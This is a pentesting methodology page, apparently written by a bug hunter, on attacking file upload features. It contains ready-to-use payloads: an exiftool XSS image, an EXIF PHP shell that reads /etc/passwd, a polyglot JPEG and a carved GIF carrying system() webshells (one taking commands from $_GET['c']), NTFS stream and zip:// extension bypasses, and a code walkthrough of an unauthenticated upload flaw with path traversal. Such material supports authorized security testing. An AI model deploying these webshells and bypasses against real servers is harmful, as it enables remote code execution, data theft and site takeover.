# Upload of Malicious Files

## Check List

## Methodology

### Black Box

#### [XSS Stored via Upload avatar PNG \[HTML\]](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/Files/xss_comment_exif_metadata_double_quote.png)

{% stepper %}
{% step %}
Create Malicious PNG Payload&#x20;
{% endstep %}

{% step %}
Download the XSS payload PNG or use exiftool to embed

```bash
exiftool -Comment="">alert(prompt('XSS BY ZEROX4'))" xss_comment_exif_metadata_double_quote.pn
```
{% endstep %}

{% step %}
Access Avatar Upload Page
{% endstep %}

{% step %}
Go to the locate the avatar upload form
{% endstep %}

{% step %}
Intercept Upload Request in Burp Suite
{% endstep %}

{% step %}
Modify Content-Type to `text/html`
{% endstep %}

{% step %}
Edit the Content-Type header for the uploaded file from `image/png` to `text/html` in the request
{% endstep %}

{% step %}
Submit Modified Request
{% endstep %}

{% step %}
Forward the altered request to upload the malicious PNG as HTML
{% endstep %}

{% step %}
Verify Stored XSS Execution
{% endstep %}

{% step %}
Confirm the file is saved on example.com and access it to trigger the alert payload
{% endstep %}
{% endstepper %}

***

#### NTFS Alternate Data Streams (ADS) abuse

{% stepper %}
{% step %}
Sometimes applications identify file types based on their first signature bytes. Adding/replacing them in a file might trick the application

```
PNG: \x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[
JPG: \xff\xd8\xff
GIF: GIF87a OR GIF8;
```
{% endstep %}

{% step %}
Using NTFS alternate data stream (ADS) in Windows. In this case, a colon character ":" will be inserted after a forbidden extension and before a permitted one. As a result, an empty file with the forbidden extension will be created on the server ("`file.asax:.jpg`") This file might be edited later using other techniques such as using its short filename. The "::$data" pattern can also be used to create non-empty files. Therefore, adding a dot character after this pattern might also be useful to bypass further restrictions ("`file.asp::$data.`")
{% endstep %}
{% endstepper %}

***

#### [EXIF Metadata Webshell](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files#upload-insecure-files)

{% stepper %}
{% step %}
Find a nice picture and embed the shell into the image like this

```bash
exiftool -documentname='<?php echo file_get_contents("/etc/passwd"); ?>' picture.png
```
{% endstep %}

{% step %}
Rename the jpg/png picture to the .php extension
{% endstep %}

{% step %}
Upload the picture
{% endstep %}

{% step %}
You will get an 500 error page. Ignore it. Grep the time from the response and convert it to a timestamp
{% endstep %}

{% step %}
Use the timestamp to find your shell

&#x20;`https://example.org/uploads/profile/[USERNAMAE][timestamp].php`
{% endstep %}
{% endstepper %}

***

#### [Polyglot File Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files#upload-insecure-files)

{% stepper %}
{% step %}
A Magic Number is a unique sequence of bytes at the beginning of a file that identifies its type. Even if a file’s extension is changed, the Magic Number helps the system recognize the actual file format Examples

```
PNG files start with: 89 50 4E 47 0D 0A 1A 0A
PDF files start with: %PDF-1.7
```

```http
Content-Disposition: form-data; name="image"; filename="img.jpg"
Content-Type: image/jpeg

ÿØÿàJFIFÿÛC -> jpg Magic Number
... (binary data) ...
ÿÙ
```
{% endstep %}

{% step %}
I uploaded a normal .jpg image, and the server accepted it, returning a 200 OK status\
Exploit Attempt
{% endstep %}

{% step %}
I re-send the exact same request, but this time, I modified the image content by embedding the PHP shell code inside it
{% endstep %}

{% step %}
But I send the request and changed the file extension to PHP

```http
Content-Disposition: form-data; name="image"; filename="img.php" -> change to .PHP
Content-Type: image/jpeg

ÿØÿàJFIFÿÛC
... (binary data) ...
<?php
echo "<pre>";
system("uname -a");
echo "</pre>";
?>
ÿÙ
```
{% endstep %}

{% step %}
Result: The server accepted the modified file and returned 200 OK
{% endstep %}
{% endstepper %}

***

#### [GIF Image Carving (PHP Payload Injection)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files#upload-insecure-files)

{% stepper %}
{% step %}
Identify possible image formats (starting with GIF)
{% endstep %}

{% step %}
Test how the server transforms the uploaded image
{% endstep %}

{% step %}
Replicate these transformations locally using ImageMagick and PHP
{% endstep %}

{% step %}
Determine if any sections of the image remain unmodified
{% endstep %}

{% step %}
Inject PHP code into those sections and test execution
{% endstep %}

{% step %}
Testing with GIF
{% endstep %}

{% step %}
I began with a simple one-color (black) GIF image to easily spot modifications. After uploading and downloading the image, I compared the original and transformed versions. The transformations included

Stripping EXIF data&#x20;

Resizing the image to 300x300 pixels To replicate this locally, I used the following PHP script

```php
<?php
$thumb = new Imagick('testgif.gif');
$thumb->resizeImage(300,300);
$thumb->writeImage('testgif2.gif');
$thumb->destroy();
?>
```
{% endstep %}

{% step %}
Through testing, I identified an unmodified section of the GIF file filled with `00` values. This provided enough space to inject my PHP payload
{% endstep %}

{% step %}
Payload Injection Using a hex editor in Burp Suite, I inserted the following PHP code into the GIF file

```php
<?php phpinfo();?>
<?php system($_GET['c']);?>
```
{% endstep %}

{% step %}
By carving these payloads into the unmodified section of the GIF file, I successfully achieved remote code execution after uploading the modified image
{% endstep %}
{% endstepper %}

***

#### ZIP Upload File

{% stepper %}
{% step %}
if you can upload `.zip` file on target then
{% endstep %}

{% step %}
Create a `.php` file (`rce.php`)
{% endstep %}

{% step %}
Compress it to a `.zip` file (`file.php`)
{% endstep %}

{% step %}
Upload your `.zip` file on the vulnerable web Application
{% endstep %}

{% step %}
Trigger your RCE via&#x20;

`(https://<target Site>.com/index.php?page=zip://path/file.zip#rce.php`
{% endstep %}
{% endstepper %}

***

### White Box

#### Download Remote File in Protocol

{% stepper %}
{% step %}
Map the entire target system using Burp Suite
{% endstep %}

{% step %}
Draw all endpoints in XMind
{% endstep %}

{% step %}
Decompile the web server based on the programming language used
{% endstep %}

{% step %}
Look for endpoints that use a protocol and make an external request, such as SFTP
{% endstep %}

{% step %}
In the code, find where external requests are processed
{% endstep %}

{% step %}
Check whether functions named `getRemoteFileURL` and `handleDownloadFile` exist in the processing logic and whether they allow downloading files from a URL, like in the code below

```php
function validateContextForAction($actionName, $context) {
        switch ($actionName) {
            case 'uploadFile':
            case 'uploadFileToNewDirectory':
            case 'uploadArchive':
                if (isset($context['remotePath'])) {
                    $validatedPath = InputValidator::validateFilePath($context['remotePath'], true);
                    // Additional upload-specific validation
                    if (isset($context['localPath'])) {
                        InputValidator::validateFileUpload($context['localPath'], $validatedPath);
                    }
                }
                break;
                
            case 'downloadFile':
            case 'fetchFile':
            case 'getFileContents':
            case 'deleteFile':
                if (isset($context['remotePath'])) {
                    InputValidator::validateFilePath($context['remotePath'], true);
                }
                break;
                
            .. snip ..
        }
```
{% endstep %}

{% step %}
Features and functions such as `downloadFile` are highly important; you can see the processing code below

```php
public function downloadFile($transferOperation) {
    $this->ensureConnectedAndAuthenticated('DOWNLOAD_OPERATION');

    if (!$this->handleDownloadFile($transferOperation))
        $this->handleMultiTransferError('DOWNLOAD_OPERATION', $transferOperation);
}
```
{% endstep %}

{% step %}
After reviewing the function, check whether the file received from the external server is copied directly to the system, what path it is copied to, and whether that path is user-controlled, like in the code below

```php
protected function handleDownloadFile($transferOperation) {
    $remoteURL = $this->getRemoteFileURL($transferOperation->getRemotePath());  <---- [0]

     if(copy($remoteURL, $transferOperation->getLocalPath())) <---- [1]
         return true;

    // Check if remote file exists to provide better error information
    $statResult = stat($remoteURL);
    return false; // Copy failed
}
```

```php
public function copy($source, $destination) {
    $this->ensureConnectedAndAuthenticated('COPY_OPERATION');

    .. snip ..

    for ($i = 0; $i < sizeof($sources); ++$i) {
        $destinationPath = $destinations[$i];
        $destinationDir = PathOperations::remoteDirname($destinationPath);

        $sourcePathAndItem = $sources[$i];

        $sourcePath = $sourcePathAndItem[0];
        $sourceItem = $sourcePathAndItem[1];

        if ($destinationDir != "" && $destinationDir != "/" &&
            array_search($destinationDir, $destinationDirs) === false) {
            $destinationDirs[] = $destinationDir;
            $this->makeDirectoryWithIntermediates($destinationDir);
        }

        if ($sourceItem === null)
            $this->handleCopy($sourcePath, $destinationPath);
        else {
            if ($sourceItem->isDirectory()) {
                if (array_search($destinationPath, $destinationDirs) === false) {
                    $destinationDirs[] = $destinationPath;
                    $this->makeDirectoryWithIntermediates($destinationPath);
                }
            } else {
                $this->handleCopy($sourcePath, $destinationPath);
            }

            $newPermissions[$destinationPath] = $sourceItem->getNumericPermissions();
        }
    }

    .. snip ..
 }
```
{% endstep %}
{% endstepper %}

***

#### Remote Code Execution via File Upload (Unuthenticate)

{% stepper %}
{% step %}
Map the entire target system using Burp Suite
{% endstep %}

{% step %}
Draw all endpoints in XMind
{% endstep %}

{% step %}
Decompile the web server based on the programming language used
{% endstep %}

{% step %}
In the code, look for the file upload processing logic and check whether it requires authentication or not, like in the code below

```csharp
[ShortDescription("")]
[Description("Upload a file chunk.")]
[AuthenticatedService(AllowAnonymous = true)]
[Route("")]
[HttpPost]
[Returns(typeof(string))]
public async Task<ActionResult> Upload()
{
	ActionResult actionResult;
	try
	{
		StringValues stringValues = base.Request.Form["context"]; // [1]
		StringValues stringValues2 = base.Request.Form["contextData"]; // [2]
		if (base.Request.Form.Files.Count == 0) // [3]
		{
			actionResult = this.StatusCode(415);
		}
		else
		{
			//...
				if (stringValues2 != StringValues.Empty)
				{
					pupData.targetData = JsonConvert.DeserializeObject<PostUploadProcessingTargetData>(stringValues2.ToString()); // [4]
				}
				//...
				switch (readPartResult2.status)
				{
				case ReadPartStatus.BAD:
					actionResult = base.CreateStatusCode(HttpStatusCode.InternalServerError, readPartResult2.message);
					break;
				case ReadPartStatus.GOOD:
					actionResult = this.Ok("");
					break;
				case ReadPartStatus.DONE:
				{
					ResumableConfiguration uploadConfiguration = this.GetUploadConfiguration();
					FileStream file = FileX.OpenRead(readPartResult2.filePath);
					object obj = null;
					SmarterMail.Web.Logic.UploadResult retStatus;
					try
					{
						retStatus = await UploadLogic.ProcessCompletedUpload(this.WebHostEnvironment, base.HttpContext, base.HttpAbsoluteRootPath, base.VirtualAppPath, currentUserTemp, pupData, new SmarterMail.Web.Logic.UploadedFile
						{
							fileName = uploadConfiguration.FileName,
							stream = file
						});
					}); // [5]			
//...
```
{% endstep %}

{% step %}
Review the processing logic in the code (the function that completes the file upload process)

```csharp
public static async Task<UploadResult> ProcessCompletedUpload(IWebHostEnvironment webHostEnvironment, HttpContext httpContext, string httpAbsoluteRootPath, string virtualAppPath, UserData currentUser, PostUploadProcessing pupData, UploadedFile file)
{
	UploadResult uploadResult;
	try
	{
		//...
		string target = pupData.target;
		if (target != null)
		{
			switch (target.Length)
			{
			case 8:
				if (target == "task-ics")
				{
					return UploadLogic.TaskImportIcsFile(currentUser, file, pupData.targetData.source, pupData.targetData.fileId);
				}
				break;
			case 10:
				if (target == "attachment") // [1]
				{
					return await MailLogic.SaveAttachment(webHostEnvironment, httpAbsoluteRootPath, currentUser, file, pupData.targetData.guid, ""); // [2]
				}
				break;
			case 11:
				if (target == "note-import")
				{
					return NoteLogic.ImportNote(currentUser, file, pupData.targetData.source);
				}
				break;
				//...
			//...
}
```
{% endstep %}

{% step %}
Check the processing of all file types that can be uploaded, especially files of type `attachment`

you can use this regex for find vulnerability

**VSCODE**

```regex
(?<Source>file\.(fileName|stream))|(?<Sink>FileStream\s+\w*\s*=\s*new\s+FileStream\(|\.CopyTo\()
```

**RipGrep**

```regex
(file\.(fileName|stream))|(FileStream\s+\w*\s*=\s*new\s+FileStream\(|\.CopyTo\()
```

```csharp
public static async Task<UploadResult> SaveAttachment(IWebHostEnvironment _webHostEnvironment, string httpAbsoluteRootPath, UserData currentUser, UploadedFile file, string guid, string contentId = "")
{
	//...
	try
	{
		if (file != null && file.stream.Length > 0L)
		{
			sanitizedName = AttachmentsHelper.SanitizeFilename(file.fileName); // [1]
			string text = AttachmentsHelper.FindExtension(sanitizedName); // [2]
			DirectoryInfoX directoryInfoX = new DirectoryInfoX(PathX.Combine(FileManager.BaseDirectory, "App_Data", "Attachments")); // [3]
			if (!DirectoryX.Exists(directoryInfoX.ToString()))
			{
				DirectoryX.CreateDirectory(directoryInfoX.ToString());
			}
			//...
			lock (attachments)
			{
				List<AttachmentInfo> list;
				AttachmentsHelper.Attachments.TryGetValue(attachguid, out list);
				if (list != null)
				{
					if (list.FirstOrDefault((AttachmentInfo x) => x.Size == attachmentInfo.Size && x.ContentType == attachmentInfo.ContentType && x.ActualFileName == attachmentInfo.ActualFileName) == null)
					{
						attachmentInfo.GeneratedFileName = AttachmentsHelper.GenerateFileName(attachguid, list.Count, text); // [4]
						attachmentInfo.GeneratedFileNameAndLocation = AttachmentsHelper.GenerateFileNameAndLocation(directoryInfoX.ToString(), attachmentInfo.GeneratedFileName); // [5]
						list.Add(attachmentInfo);
					}
				}
				else
				{
					attachmentInfo.GeneratedFileName = AttachmentsHelper.GenerateFileName(attachguid, 0, text); // [6]
					attachmentInfo.GeneratedFileNameAndLocation = AttachmentsHelper.GenerateFileNameAndLocation(directoryInfoX.ToString(), attachmentInfo.GeneratedFileName); // [7]
					//...
				}
			}
			if (attachmentInfo.GeneratedFileName != null && attachmentInfo.GeneratedFileName.Length > 0)
			{
				using (FileStream fileStream = new FileStream(attachmentInfo.GeneratedFileNameAndLocation, FileMode.Create, FileAccess.Write))
				{
					file.stream.CopyTo(fileStream); // [8]
				}
				//...
			}
		//...
		}
	//...
	}
	//...
}
```
{% endstep %}

{% step %}
Examine the function that checks the uploaded file type carefully to see whether it has any protections or not

```csharp
private static string FindExtension(string fileName)
		{
			if (fileName == null || fileName.Length < 1 || !fileName.Contains("."))
			{
				return "";
			}
			string[] array = fileName.Split('.', StringSplitOptions.None);
			return array[array.Length - 1];
```
{% endstep %}

{% step %}
Then review how the filename is processed, because even if the filename is filtered and validated, a GUID may still allow a **Path Traversal** vulnerability, like in the code below

```csharp
private static string GenerateFileName(string attachguid, int count, string extension)
	{
		if (extension != null && extension.Length > 0)
		{
			return string.Format("att_{0}_{1}.{2}", AttachmentsHelper.<GenerateFileName>g__CleanGuid|20_0(attachguid), count, extension);
		}
		return string.Format("att_{0}_{1}", AttachmentsHelper.<GenerateFileName>g__CleanGuid|20_0(attachguid), count);
	}
```
{% endstep %}
{% endstepper %}

***

#### sss



## Cheat Sheet
